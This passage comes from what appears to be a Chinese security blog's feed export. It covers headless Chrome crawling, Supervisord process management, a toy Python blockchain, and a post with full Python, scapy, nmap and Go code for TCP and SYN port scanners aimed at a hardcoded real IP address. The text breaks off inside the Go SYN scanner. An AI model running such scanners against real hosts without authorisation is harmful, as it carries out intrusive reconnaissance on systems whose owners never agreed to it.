说明：同样的在运行这段代码前，先运行chrome headless监听程序。 然后运行该程序：1python nmask.py 说明：运行程序，最终得到渲染过程中请求的url、响应码、响应内容长度。 Chrome Debugging Protocol 无论是nodejs版本的chrome-remote-interface还是python版本的，实现的底层都是基于Chrome Debugging Protocol接口，官方文档，因此在使用chrome-remote-interface过程中，可以查询一下这个文档。比如python版本中network__response_received函数，是封装了Chrome Debugging Protocol接口Network.ResponseReceived函数，而此函数接受的参数，以及一些属性方法等都可以在该文档中查询。 解决文章开头的问题 文章开头还留了一个问题，有哪些即可以实现程序化又可以实现自动化的抓包工具？想想chrome-remote-interface能干啥？其一可以使用nodejs、python（可能还有其他语言封装的项目）编程，底层接口文档比较完善；其二用它来写web2.0爬虫，访问页面产生流量，当然区别web1.0爬虫，这里的流量是完整的流量，相当于人工打开浏览器访问网页；其三可以获取流量，并且进行分析。第一点功能实现了程序化，第二三点功能实现了自动化。 最后让我们回过头看一下前文提到的自动化测试方案–主动扫描器，其短板就是没法解决web2.0爬虫的困境，而chrome-remote-interface恰恰可以解决，发挥下想象力，其前途应该无限！]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>chrome_remote_interface</tag>
        <tag>headless chrome</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Supervisord管理进程实践]]></title>
    <url>../../../../../../../../2018/06/01/1/</url>
    <content type="text"><![CDATA[小孩在门前唱着歌阳光它照暖了溪河 今天凑空研究了下Supervisord，这是一款linux进程管理工具，使用python开发，主要用于在后台维护进程（类似master守护进程），可以实现监控进程的状态、自动重启进程等操作，便于一些服务的维护与监控。 安装Supervisord由于是用python开发的，因此使用pip安装最为方便。1$ pip install supervisor 说明：安装完成之后多了3个工具：echo_supervisord_conf、supervisorctl和supervisord。 Supervisord配置文件首先可以使用echo_supervisord_conf命令获取supervisor配置模板：1echo_supervisord_conf &gt; supervisord.conf 说明：该命令在当前目录下创建了一个文件名为supervisord.conf的配置文件，编辑配置文件：1vim supervisord.conf 来看看默认配置文件中的主要配置项：（还有一些配置不常用，可以忽略）123456789101112131415161718192021222324252627282930313233[unix_http_server]file=/tmp/supervisor.sock ; UNIX socket 文件，supervisorctl 会使用;chmod=0700 ; socket 文件的 mode，默认是 0700;chown=nobody:nogroup ; socket 文件的 owner，格式： uid:gid;[inet_http_server] ; HTTP 服务器，提供 web 管理界面;port=127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性;username=user ; 登录管理后台的用户名;password=123 ; 登录管理后台的密码[supervisord]logfile=/tmp/supervisord.log ; 日志文件，默认是 $CWD/supervisord.loglogfile_maxbytes=50MB ; 日志文件大小，超出会 rotate，默认 50MBlogfile_backups=10 ; 日志文件保留备份数量默认 10loglevel=info ; 日志级别，默认 info，其它: debug,warn,tracepidfile=/tmp/supervisord.pid ; pid 文件nodaemon=false ; 是否在前台启动，默认是 false，即以 daemon 的方式启动minfds=1024 ; 可以打开的文件描述符的最小值，默认 1024minprocs=200 ; 可以打开的进程数的最小值，默认 200; the below section must remain in the config file for RPC; (supervisorctl/web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl=unix:///tmp/supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致;serverurl=http://127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord; 包含其他的配置文件[include]files = relative/directory/*.ini ; 可以是 *.conf 或 *.ini 运行以下命令启动supervisord进程，可测试supervisord是否安装成功并执行。1supervisord -c supervisord.conf 查看系统进程中是否多了一个supervisord：1ps -aux | grep supervisord 配置Program program就是用来配置监控不同的应用程序进程的，推荐每个应用程序单独写一个program配置文件，然后在supervisord.conf中通过include加载所有应用程序的配置。这里拿创建一个celery进程为例，首先在supervisord.conf最后一行写入：123;加载/etc/supervisor/目录下所有的配置文件[include]files = /etc/supervisor/*.conf 然后创建/etc/supervisor目录，并到目录下创建/etc/supervisor/celery_touchscan.conf文件，写入：123456789101112131415161718192021222324;program名称，随便写，但不要重复，是program的唯一标识[program:celery_touchscan];指定运行目录directory=/root/TouchScanV2/ ;运行目录下执行命令command=celery -A scan worker --queue=touchscan --pidfile="./log/pid.txt" --logfile="./log/scan.log" -c 10;进程名称process_name=%(program_name)s_%(process_num)02d;启动设置numprocs=1 ;进程数，注意：（celery进程数量,不是work数量，相当于执行了10个command命令，而不是在celery中指定-c 为10）autostart=true ;当supervisor启动时,程序将会自动启动autorestart=true ;自动重启（当work被kill了之后会重新启动）;运行程序的用户;user=root;startsecs=1 ;程序重启时候停留在runing状态的秒数;startretries=10 ;启动失败时的最多重试次数;停止信号,默认TERM;中断:INT (类似于Ctrl+C)(kill -INT pid)，退出后会将写文件或日志(推荐);终止:TERM (kill -TERM pid);挂起:HUP (kill -HUP pid),注意与Ctrl+Z/kill -stop pid不同;从容停止:QUIT (kill -QUIT pid)stopsignal=INT 重启supervisord进程：1supervisorctl -c supervisord.conf reload 此时查看系统上的进程，发现创建了一个supervisord守护进程，10个celery的work进程（celery的work进程数量取决于command命令中的-c参数以及配置文件中的numprocs参数，numprocs参数是指运行几次command命令，而在celery命令行中指定了需要运行的work数量） 说明：此时如果手动kill掉celery的work进程，会发现celery的work进程会被supervisord自动重启，只有当supervisord守护进程被kill以后，才能真正kill掉celery的work进程。 supervisord命令行操作启动supervisord进程1supervisord -c supervisord.conf 关闭supervisord进程1supervisorctl -c supervisord.conf shutdown #注意这里将supervisord进程关闭，但通过supervisord启动的进程没有关闭 重启supervisord进程1supervisorctl -c supervisord.conf reload 查看进程状态1supervisorctl 效果如下：每列分别代表：programe名称、进程名称，进程状态、进程id，运行时间 更多supervisorctl命令123456$ supervisorctl status$ supervisorctl stop celery_touchscan # celery_touchscan是一个program的名称$ supervisorctl start celery_touchscan$ supervisorctl restart celery_touchscan$ supervisorctl reread$ supervisorctl update 说明：可以直接在系统shell中执行，也可以先执行supervisorctl，进入supervisorctl_shell中执行相应的命令。 针对Python环境如果项目使用了python的pyenv模块来设置环境，则supervisord配置文件中需要指定python环境的路径。其中有两种方式指定程序使用的Python环境： command使用绝对路径。 通过environment配置PYTHONPATH。 使用supervisord注意点子进程问题有时候用Supervisor托管的程序还会有子进程，如果只杀死主进程，子进程就可能变成孤儿进程。通过以下这两项配置来确保所有子进程都能正确停止：12stopasgroup=truekillasgroup=true 配置更新每次修改supervisord配置文件后，需要重启supervisord进程。 后台程序问题Supervisor只能管理在前台运行的程序，所以如果应用程序有后台运行的选项，需要关闭。 supervisord与定时任务supervisord主要用来管理进程，而不是调度任务，因此如果有定时任务的需求，跟结合crontab一起使用。当然如果是管理celery服务，可以结合celery自身的定时任务功能，具体可移步：https://thief.one/2017/08/25/1/ supervisord xml-rpc前面介绍的都是在本地利用supervisord管理进程，那么如何实现在远处管理服务器上的进程呢？supervisord工具提供了相关的api。首先需要在配置文件中打开相关配置信息：1234[inet_http_server] ; HTTP 服务器，提供 web 管理界面port=127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性username=user ; 登录管理后台的用户名password=123 ; 登录管理后台的密码 然后启动supervisord后，可以用web界面管理进程，打开http://127.0.0.1:9001。当然也提供了rpc接口，可供远程调用，代码样例如下：123456789import xmlrpclibserver = xmlrpclib.Server('http://user:123@127.0.0.1:9111/RPC2') #连接rpc服务# print server.system.listMethods() # 查询api支持的方法# print server.supervisor.getState() # 获取supervisord进程状态# print server.supervisor.shutdown() # 关闭supervisor,慎用# print server.supervisor.restart() # 重启supervisorprint server.supervisor.getProcessInfo(process_name) # 获取指定进程信息print server.supervisor.startProcess(process_name) # 启动指定进程print server.supervisor.stopProcess(process_name) # 暂停指定进程 api操作比较简单，具体的方法使用文档可以参考：http://supervisord.org/api.html#xml-rpc 参考https://pypi.org/project/supervisor/https://www.jianshu.com/p/9559ab642d88http://liyangliang.me/posts/2015/06/using-supervisor/]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Supervisord</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链系列·python实现的区块链]]></title>
    <url>../../../../../../../../2018/05/25/1/</url>
    <content type="text"><![CDATA[地是床 天是被 流星是眼泪有时醒 有时醉 大雁飞一个来回 听说现在会点区块链技术的工资都高破天了，抱着对高工资的幻想，我决定也开始学一学区块链吧。那么我想接触区块链的第一步必须得是去交易平台注册个帐号，然后充点钱买0.00001个BTC了。（2333，~!~现在我穷得只剩下币了） 老实说区块链技术还是有点难理解的，为此我搜了搜区块链的实现代码，想着结合代码看获许会简单一点，于是我发现有人用python实现了简单的区块链，于是再原作者基础上，我稍微修改了点内容，在此粘贴一下，以供学习。原项目地址：https://github.com/xilibi2003/blockchain 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239#! -*- coding:utf-8 -*-import hashlibimport jsonfrom time import timeclass Blockchain(object): ''' 区块链 一个区块结构（每个区块的字典顺序必须一致）： block = &#123; 'index': 1, # 区块索引 'timestamp': 1506057125.900785, # 时间戳 'transactions': [ # 交易列表 &#123; 'sender': "8527147fe1f5426f9dd545de4b27ee00", 'recipient': "a77f5cdfa2934df3954a5c7c7da5df1f", 'amount': 5, &#125; ], 'proof': 324984774000, # 工作量证明 'previous_hash': "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824" &#125; ''' def __init__(self): self.chain = [] # 区块列表 self.current_transactions = [] # 交易列表 self.nodes = set() # 节点列表(避免重复) self.new_block(previous_hash=1, proof=100) # 创造创世区块 def register_node(self,address): ''' 注册节点 Add a new node to the list of nodes :param address: &lt;str&gt; 节点地址 '192.168.0.1:5000' :return: None ''' self.nodes.add(address) def valid_chain(self,chain): ''' 验证区块链的有效性 :param chain: &lt;list&gt; 一个完整的区块链 :return: &lt;bool&gt; True if valid, False if not ''' previous_block = chain[0] # 前一个区块 current_index = 1 # 当前区块索引 while current_index &lt; len(chain): block = chain[current_index] # 当前区块 if block['previous_hash'] != self.hash(previous_block): ''' hash值验证 ''' return False if not self.valid_proof(previous_block['proof'],block['proof']): ''' 工作量证明验证 ''' return False previous_block = block current_index += 1 return True def resolve_conflicts(self): ''' 共识算法解决不同节点账本不相同的冲突 使用网络中最长的有效区块链 :return: &lt;bool&gt; True 如果链被取代, 否则为False ''' neighbours = self.nodes # 网络中所有节点列表 new_chain = None max_length = len(self.chain) # 当前节点的区块链长度 for node in neighbours: # 遍历所有网络节点，若有比本节点有效区块链长的，则替换掉本地区块链 # 通过api获取 length = 100 # 某节点区块链长度 chain = [] # 某节点区块链列表 if length &gt; max_length and self.valid_chain(chain): max_length = length new_chain = chain if new_chain: self.chain = new_chain return True return False def new_block(self,proof,previous_hash=None): ''' 创建新的区块，添加到区块链中 生成新块 :param proof: &lt;int&gt; 工作量证明 :param previous_hash: 前一个区块的hash值 :return: &lt;dict&gt; 新区块 ''' block = &#123; 'index': len(self.chain) + 1, # 确保索引在区块链尾部 'timestamp': time(), 'transactions': self.current_transactions, # 交易列表 'proof': proof, # 工作量证明 'previous_hash': previous_hash or self.hash(self.chain[-1]), # 此区块前一个区块的hash &#125; # 对交易的详细内容可以进行操作，比如说增加金币，或者减少金币等等。 self.current_transactions = [] # 重置交易列表 self.chain.append(block) # 将新的区块添加到区块链中 return block def new_transactions(self,sender,recipient,amount): ''' 添加新的交易到交易列表中 生成新交易信息，信息将加入到下一个待挖的区块中 :param sender: &lt;str&gt; 发送者地址 :param recipient: &lt;str&gt; 接收着地址 :param amount: &lt;int&gt; 金额或者数量 :return: &lt;int&gt; 返回这笔交易的区块链索引（将这笔交易添加到区块链最后面） ''' self.current_transactions.append(&#123; "sender":sender, 'recipient':recipient, 'amount':amount, &#125;) return self.last_block['index'] + 1 @staticmethod def hash(block): ''' 计算一个区块的hash值 生成块的 SHA-256 hash值 :param block: &lt;dict&gt; Block :return: &lt;str&gt; ''' block_string = json.dumps(block, sort_keys=True).encode() return hashlib.sha256(block_string).hexdigest() @property def last_block(self): ''' 区块链中最后一个区块 ''' return self.chain[-1] # 返回区块链中最后一个区块 def proof_of_work(self, last_proof): ''' 简单的工作量证明: - 查找一个 p' 使得 hash(pp') 以4个0开头 - p 是上一个块的证明, p' 是当前的证明 :param last_proof: &lt;int&gt; :return: &lt;int&gt; ''' proof = 0 while self.valid_proof(last_proof, proof) is False: proof += 1 return proof @staticmethod def valid_proof(last_proof,proof): ''' 验证证明: 是否hash(last_proof, proof)以4个0开头? :param last_proof: &lt;int&gt; 前一个区块的hash :param proof: &lt;int&gt; 当前区块的hash :return: &lt;bool&gt; True or False ''' guess = (str(last_proof)+str(proof)).encode() guess_hash = hashlib.sha256(guess).hexdigest() return guess_hash[:4] == "0000"if __name__=="__main__": # 运行这一段脚本就是一个区块链节点，而节点之间可以通过api的方式互相传递信息 # 每个节点都每隔10分钟运行一次 blockchain = Blockchain() for i in range(2): # 同步一下区块 # 开始挖矿 last_block = blockchain.last_block last_proof = last_block['proof'] proof = blockchain.proof_of_work(last_proof) # 挖矿成功后，生成新的交易（奖励交易） blockchain.new_transactions(sender="0",recipient="000002",amount=1) # 添加新的交易(不是奖励交易，而是普通交易) blockchain.new_transactions(sender="0000001",recipient="000002",amount=1) # 输出当前交易列表 print "current_transactions lists is: \n",blockchain.current_transactions # 挖矿成功后，生成新的区块（包含奖励交易信息、新增的交易信息），只有挖矿成功后，才能创造出新的区块。 block = blockchain.new_block(proof) # 输出当前区块链 print "current chain lists is: \n",blockchain.chain 从本篇开始，我将继续学习一些区块链的技术以及区块链安全相关的技术，并会总结成系列文章在博客发布，技术有限请多包涵！]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[端口扫描器的几种代码实现方案]]></title>
    <url>../../../../../../../../2018/05/17/1/</url>
    <content type="text"><![CDATA[这雨夜太漫长 失眠的我 在谁梦里 歌唱 搞安全的应该都知道端口扫描在渗透测试、漏洞扫描过程中的重要性，其与URL爬虫等技术构成了漏洞扫描的第一阶段，即目标信息收集。因此能否开发出一款高效稳定的端口扫描器，往往决定了漏洞扫描器的好坏。那么说到端口扫描器，我们往往会先想到nmap、masscan等神器，它们是这个领域的标杆。但本篇并不是为了介绍这几款工具，而是谈谈如何自研一款高效稳定的端口扫描器。 端口扫描器，顾名思义就是为了探测服务器上的某个端口是否开放，究其原理可以分为很多种探测方式，比如tcp三次握手扫描，syn扫描等等，本篇并不打算详细介绍这些扫描方式的区别，有兴趣的可以看下nmap的文档，对这几种扫描方式有详细的介绍。 那么说下本文重点，基于这几天我研究并尝试利用python、go开发tcp扫描器、tcp-syn扫描器，以及对比它们之间的速度性能、稳定性差异情况，将测试结果在此做个记录，并分享一下代码以及方案。 说明：文章结尾将给出本篇所使用代码的Github地址，可供大家测试，代码测试环境为centos7。 scan for Python SocketPython的Socket模块可以创建套接字，创建tcp三次握手连接，以此探测目标端口是否存活。本篇将使用socket模块编写tcp扫描以及syn扫描，并对比两者的差异。 tcp scan快来看代码：12345678910111213141516171819202122232425262728293031#! -*- coding:utf-8 -*-import timeimport socketsocket_timeout = 0.1def tcp_scan(ip,port): try: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.settimeout(socket_timeout) c=s.connect_ex((ip,port)) if c==0: print "%s:%s is open" % (ip,port) else: # print "%s:%s is not open" % (ip,port) pass except Exception,e: print e s.close()if __name__=="__main__": s_time = time.time() ip = "14.215.177.38" for port in range(0,1024): ''' 此处可用协作 ''' tcp_scan(ip,port) e_time = time.time() print "scan time is ",e_time-s_time 运行结果： 说明一下：可以看到此代码扫描1024个端口用了102s，当然代码并没有用多线程、协程等方式提高扫描效率（使用协程测试过扫65535个端口用时400s左右），因为python在这方面的能力比较弱；由于扫描过程中会建立tcp三次握手，因此比较消耗资源。 tcp syn scan 相对tcp扫描，tcp syn扫描方式更为隐蔽，也更节省资源，那么如何利用socket模块实现tcp syn扫描呢？这里需要用到SOCK_RAW，这个在socket编程中相对少用，资料也不多。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141# -*- coding: UTF-8 -*- import timeimport randomimport socketimport sysfrom struct import *'''Warning:must run it as rootyum install python-devel libpcap-develpip install pcap'''def checksum(msg): ''' Check Summing ''' s = 0 for i in range(0,len(msg),2): w = (ord(msg[i]) &lt;&lt; 8) + (ord(msg[i+1])) s = s+w s = (s&gt;&gt;16) + (s &amp; 0xffff) s = ~s &amp; 0xffff return sdef CreateSocket(source_ip,dest_ip): ''' create socket connection ''' try: s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) except socket.error, msg: print 'Socket create error: ',str(msg[0]),'message: ',msg[1] sys.exit() ''' Set the IP header manually ''' s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) return sdef CreateIpHeader(source_ip, dest_ip): ''' create ip header ''' # packet = '' # ip header option headerlen = 5 version = 4 tos = 0 tot_len = 20 + 20 id = random.randrange(18000,65535,1) frag_off = 0 ttl = 255 protocol = socket.IPPROTO_TCP check = 10 saddr = socket.inet_aton ( source_ip ) daddr = socket.inet_aton ( dest_ip ) hl_version = (version &lt;&lt; 4) + headerlen ip_header = pack('!BBHHHBBH4s4s', hl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr) return ip_headerdef create_tcp_syn_header(source_ip, dest_ip, dest_port): ''' create tcp syn header function ''' source = random.randrange(32000,62000,1) # randon select one source_port seq = 0 ack_seq = 0 doff = 5 ''' tcp flags ''' fin = 0 syn = 1 rst = 0 psh = 0 ack = 0 urg = 0 window = socket.htons (8192) # max windows size check = 0 urg_ptr = 0 offset_res = (doff &lt;&lt; 4) + 0 tcp_flags = fin + (syn&lt;&lt;1) + (rst&lt;&lt;2) + (psh&lt;&lt;3) + (ack&lt;&lt;4) + (urg&lt;&lt;5) tcp_header = pack('!HHLLBBHHH', source, dest_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr) ''' headers option ''' source_address = socket.inet_aton( source_ip ) dest_address = socket.inet_aton( dest_ip ) placeholder = 0 protocol = socket.IPPROTO_TCP tcp_length = len(tcp_header) psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length); psh = psh + tcp_header; tcp_checksum = checksum(psh) ''' Repack the TCP header and fill in the correct checksum ''' tcp_header = pack('!HHLLBBHHH', source, dest_port, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr) return tcp_headerdef syn_scan(source_ip, dest_ip, des_port) : s = CreateSocket(source_ip, dest_ip) ip_header = CreateIpHeader(source_ip, dest_ip) tcp_header = create_tcp_syn_header(source_ip, dest_ip, des_port) packet = ip_header + tcp_header s.sendto(packet, (dest_ip, 0)) data = s.recvfrom(1024) [0][0:] ip_header_len = (ord(data[0]) &amp; 0x0f) * 4 # ip_header_ret = data[0: ip_header_len - 1] tcp_header_len = (ord(data[32]) &amp; 0xf0)&gt;&gt;2 tcp_header_ret = data[ip_header_len:ip_header_len+tcp_header_len - 1] ''' SYN/ACK flags ''' if ord(tcp_header_ret[13]) == 0x12: print "%s:%s is open" % (dest_ip,des_port) else: print "%s:%s is not open" % (dest_ip,des_port)if __name__=="__main__": t_s = time.time() source_ip = '' # 填写本机ip dest_ip = '14.215.177.38' for des_port in range(1024): syn_scan(source_ip, dest_ip, des_port) t_e = time.time() print "time is ",(t_e-t_s) 有一点需要注意的，运行这段代码前，需要在系统上安装依赖:12yum install python-devel libpcap-develpip install pcap 运行结果： 说明：从运行结果上来看，并没有很准确，而且速度也不快，不清楚是不是代码上有问题。 scan for Python scapy除了socket模块外，python还有一个scapy模块，可以用来模拟发包，但只能在linux下使用，其他操作系统不建议使用此模块。 tcp syn csan代码在这里：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#! -*- coding:utf-8 -*-import timefrom scapy.all import *ip = "14.215.177.38"TIMEOUT = 0.5threads = 500port_range = 1024retry = 1def is_up(ip): """ Tests if host is up """ icmp = IP(dst=ip)/ICMP() resp = sr1(icmp, timeout=TIMEOUT) if resp == None: return False else: return Truedef reset_half_open(ip, ports): # Reset the connection to stop half-open connections from pooling up sr(IP(dst=ip)/TCP(dport=ports, flags='AR'), timeout=TIMEOUT)def is_open(ip, ports): to_reset = [] results = [] p = IP(dst=ip)/TCP(dport=ports, flags='S') # Forging SYN packet answers, un_answered = sr(p, verbose=False, retry=retry ,timeout=TIMEOUT) # Send the packets for req, resp in answers: if not resp.haslayer(TCP): continue tcp_layer = resp.getlayer(TCP) if tcp_layer.flags == 0x12: # port is open to_reset.append(tcp_layer.sport) results.append(tcp_layer.sport) elif tcp_layer.flags == 0x14: # port is open pass reset_half_open(ip, to_reset) return resultsdef chunks(l, n): """Yield successive n-sized chunks from l.""" for i in range(0, len(l), n): yield l[i:i + n]if __name__ == '__main__': start_time = time.time() open_port_list = [] for ports in chunks(list(range(port_range)), threads): results = is_open(ip, ports) if results: open_port_list += results end_time = time.time() print "%s %s" % (ip,open_port_list) print "%s Scan Completed in %fs" % (ip, end_time-start_time) 运行结果： 说明：由于scapy可以一次性发多个syn包，因此速度相对socket更快一些，但稳定性没有很好。 scan for python+nmap文章开头提到了nmap，其实在python中也可以直接调用nmap，看代码：123456789101112131415161718192021222324252627#! -*- coding:utf-8 -*-'''pip install python-nmap'''import nmapnm =nmap.PortScanner()def scan(ip,port,arg): try: nm.scan(ip, arguments=arg+str(port)) except nmap.nmap.PortScannerError: print "Please run -O method for root privileges" else: for host in nm.all_hosts(): for proto in nm[host].all_protocols(): lport = nm[host][proto].keys() lport.sort() for port in lport: print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))if __name__=="__main__": port="80,443,22,21" scan(ip="14.215.177.38",port=port,arg="-sS -Pn -p") # tcp scan -sT # tcp syn scan -sS 运行结果：由于nmap扫描速度相对比较慢，因此这里只演示扫描4个端口，不做速度的对比，当然其稳定性还是可以的。 scan for go 前文一直在介绍使用python语言开发端口扫描器，然而由于python在多线程方面的弱势，扫描器的性能可想而知，因此我又利用go语言的高并发性优势，尝试开发端口扫描器。（题外话：为此我花了半天时间看了下go语言的基础，勉强看懂了扫描代码，并做了一些修改） tcp scan直接看代码吧：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121package main// port tcp scanimport ( "fmt" "net" "os" "runtime" "strconv" "sync" "time")func loop(inport chan int, startport, endport int) &#123; for i := startport; i &lt;= endport; i++ &#123; inport &lt;- i &#125; close(inport)&#125;type ScanSafeCount struct &#123; // 结构体 count int mux sync.Mutex&#125;var scanCount ScanSafeCountfunc scanner(inport int, outport chan int, ip string, endport int) &#123; // 扫描函数 in := inport // 定义要扫描的端口号 // fmt.Printf(" %d ", in) // 输出扫描的端口 host := fmt.Sprintf("%s:%d", ip, in) // 类似（ip,port） tcpAddr, err := net.ResolveTCPAddr("tcp4", host) // 根据域名查找ip if err != nil &#123; // 域名解析ip失败 outport &lt;- 0 &#125; else &#123; conn, err := net.DialTimeout("tcp", tcpAddr.String(), 10*time.Second) //建立tcp连接 if err != nil &#123; // tcp连接失败 outport &lt;- 0 &#125; else &#123; // tcp连接成功 outport &lt;- in // 将端口写入outport信号 fmt.Printf("\n *************( %d 可以 )*****************\n", in) conn.Close() &#125; &#125; // 线程锁 scanCount.mux.Lock() scanCount.count = scanCount.count - 1 if scanCount.count &lt;= 0 &#123; close(outport) &#125; scanCount.mux.Unlock()&#125;func main() &#123; runtime.GOMAXPROCS(runtime.NumCPU()) // 设置最大可使用的cpu核数 // 定义变量 inport := make(chan int) // 信号变量，类似python中的queue outport := make(chan int) collect := []int&#123;&#125; // 定义一个切片变量，类似python中的list // fmt.Println(os.Args, len(os.Args)) // 获取命令行参数并输出 if len(os.Args) != 4 &#123; // 命令行参数个数有误 fmt.Println("使用方式： port_scanner IP startport endport") os.Exit(0) &#125; s_time := time.Now().Unix() // fmt.Println("扫描开始：") // 获取当前时间 ip := string(os.Args[1]) // 获取参数中的ip startport, _ := strconv.Atoi(os.Args[2]) // 获取参数中的启始端口 endport, _ := strconv.Atoi(os.Args[3]) // 获取参数中的结束端口 if startport &gt; endport &#123; fmt.Println("Usage: scanner IP startport endport") fmt.Println("Endport must be larger than startport") os.Exit(0) &#125; else &#123; // 定义scanCount变量为ScanSafeCount结构体，即计算扫描的端口数量 scanCount = ScanSafeCount&#123;count: (endport - startport + 1)&#125; &#125; fmt.Printf("扫描 %s：%d----------%d\n", ip, startport, endport) go loop(inport, startport, endport) // 执行loop函数将端口写入input信号 for v := range inport &#123; // 开始循环input go scanner(v, outport, ip, endport) &#125; // 输出结果 for port := range outport &#123; if port != 0 &#123; collect = append(collect, port) &#125; &#125; fmt.Println("--") fmt.Println(collect) e_time := time.Now().Unix() fmt.Println("扫描时间:", e_time-s_time)&#125; 代码我就不解释了（我在代码中加了些注释，应该大致可以看懂），本文也不打算介绍go的用法，毕竟自己也是刚开始学习go，有兴趣的可以看看go的文档，然后再回过头来看看这段代码。 代码运行结果： 说明：由于是tcp扫描，所以多少还是占资源的，而且测试发现稳定性不是很好。 tcp syn scan看代码看代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291package main// port tcp syn scanimport ( "bytes" "encoding/binary" "flag" "fmt" "log" "math/rand" "net" "os" "strconv" "strings" "time" "errors")//TCPHeader testtype TCPHeader struct &#123; SrcPort uint16 DstPort uint16 SeqNum uint32 AckNum uint32 Flags uint16 Window uint16 ChkSum uint16 UrgentPointer uint16&#125;//TCPOption testtype TCPOption struct &#123; Kind uint8 Length uint8 Data []byte&#125;type scanResult struct &#123; Port uint16 Opened bool&#125;type scanJob struct &#123; Laddr string Raddr string SPort uint16 DPort uint16 Stop uint8&#125;var stopFlag = make(chan uint8, 1)func main() &#123; rate := time.Second / 400 throttle := time.Tick(rate) jobs := make(chan *scanJob, 65536) results := make(chan *scanResult, 1000) for w := 0; w &lt; 10; w++ &#123; go worker(w, jobs, throttle, results) &#125; // 获取命令行参数 ifaceName := flag.String("i", "eth0", "Specify network") remote := flag.String("r", "", "remote address") portRange := flag.String("p", "1-1024", "port range: -p 1-1024") flag.Parse() // ifaceName := &amp;interfaceName_ // remote := &amp;remote_ // portRange := &amp;portRange_ s_time := time.Now().Unix() laddr := interfaceAddress(*ifaceName) // raddr := *remote minPort , maxPort := portSplit(portRange) // fmt.Println(laddr, raddr) // 输出源ip地址，目标ip地址 go func(num int)&#123; for i := 0; i &lt; num; i++ &#123; recvSynAck(laddr, raddr, results) &#125; &#125;(10) go func(jobLength int) &#123; for j := minPort; j &lt; maxPort + 1; j++ &#123; s := scanJob&#123; Laddr: laddr, Raddr: raddr, SPort: uint16(random(10000, 65535)), DPort: uint16(j + 1), &#125; jobs &lt;- &amp;s &#125; jobs &lt;- &amp;scanJob&#123;Stop: 1&#125; &#125;(1024) for &#123; select &#123; case res := &lt;-results: fmt.Println("扫描到开放的端口:",res.Port) case &lt;-stopFlag: e_time := time.Now().Unix() fmt.Println("总共用了多少时间(s):",e_time-s_time) os.Exit(0) &#125; &#125;&#125;func worker(id int, jobs &lt;-chan *scanJob, th &lt;-chan time.Time, results chan&lt;- *scanResult) &#123; for j := range jobs &#123; if j.Stop != 1 &#123; sendSyn(j.Laddr, j.Raddr, j.SPort, j.DPort) &#125; else &#123; stopFlag &lt;- j.Stop &#125; &lt;-th &#125;&#125;func checkError(err error) &#123; // 错误check if err != nil &#123; log.Println(err) &#125;&#125;//CheckSum testfunc CheckSum(data []byte, src, dst [4]byte) uint16 &#123; pseudoHeader := []byte&#123; src[0], src[1], src[2], src[3], dst[0], dst[1], dst[2], dst[3], 0, 6, 0, byte(len(data)), &#125; totalLength := len(pseudoHeader) + len(data) if totalLength%2 != 0 &#123; totalLength++ &#125; d := make([]byte, 0, totalLength) d = append(d, pseudoHeader...) d = append(d, data...) return ^mySum(d)&#125;func mySum(data []byte) uint16 &#123; var sum uint32 for i := 0; i &lt; len(data)-1; i += 2 &#123; sum += uint32(uint16(data[i])&lt;&lt;8 | uint16(data[i+1])) &#125; sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff) sum = sum + (sum &gt;&gt; 16) return uint16(sum)&#125;func sendSyn(laddr, raddr string, sport, dport uint16) &#123; conn, err := net.Dial("ip4:tcp", raddr) checkError(err) defer conn.Close() op := []TCPOption&#123; TCPOption&#123; Kind: 2, Length: 4, Data: []byte&#123;0x05, 0xb4&#125;, &#125;, TCPOption&#123; Kind: 0, &#125;, &#125; tcpH := TCPHeader&#123; SrcPort: sport, DstPort: dport, SeqNum: rand.Uint32(), AckNum: 0, Flags: 